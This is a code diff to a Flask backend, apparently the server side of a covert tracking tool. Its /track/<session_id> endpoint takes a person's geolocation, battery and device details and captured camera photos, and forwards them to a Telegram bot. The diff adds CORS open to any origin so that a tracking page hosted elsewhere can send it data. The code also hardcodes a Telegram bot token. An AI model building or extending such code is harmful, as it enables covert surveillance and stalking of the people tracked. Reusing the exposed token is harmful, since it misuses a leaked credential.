@@ -1,9 +1,11 @@
 import os
 import json
 import requests
-from flask import Flask, request
+from flask import Flask, request, jsonify
+from flask_cors import CORS
 
 app = Flask(__name__)
+CORS(app)  # ✅ Allow Cross-Origin Requests
 
 # Telegram Bot Configuration
 BOT_TOKEN = "7155229931:AAH0hS_AyT9waCCLAEmj9xCmpjE0oC9x3KE"
@@ -28,11 +30,21 @@ def send_telegram_photo(image_url, caption):
 def home():
     return "Flask backend is live!"
 
-@app.route('/track/<session_id>', methods=['POST'])
+@app.route('/track/<session_id>', methods=['POST', 'OPTIONS'])
 def track_device(session_id):
     """Track multiple users and send data to Telegram."""
+    if request.method == "OPTIONS":
+        response = jsonify({"status": "CORS Preflight OK"})
+        response.headers["Access-Control-Allow-Origin"] = "*"
+        response.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
+        response.headers["Access-Control-Allow-Headers"] = "Content-Type"
+        return response, 200
+
     try:
         data = request.json
+        if not data:
+            return jsonify({"error": "Invalid JSON data"}), 400
+
         battery = data.get("battery", {})
         geo = data.get("geo", {})
         device = data.get("device", {})
@@ -67,10 +79,14 @@ def track_device(session_id):
         if photo:
             send_telegram_photo(photo, "Captured Photo 📷")
 
-        return {"status": "success"}, 200
+        response = jsonify({"status": "success"})
+        response.headers["Access-Control-Allow-Origin"] = "*"
+        return response, 200
 
     except Exception as e:
-        return {"error": str(e)}, 500
+        response = jsonify({"error": str(e)})
+        response.headers["Access-Control-Allow-Origin"] = "*"
+        return response, 500
 
 if __name__ == '__main__':
     port = int(os.getenv("PORT", 10000))  # Use Render-assigned PORT or default 10000
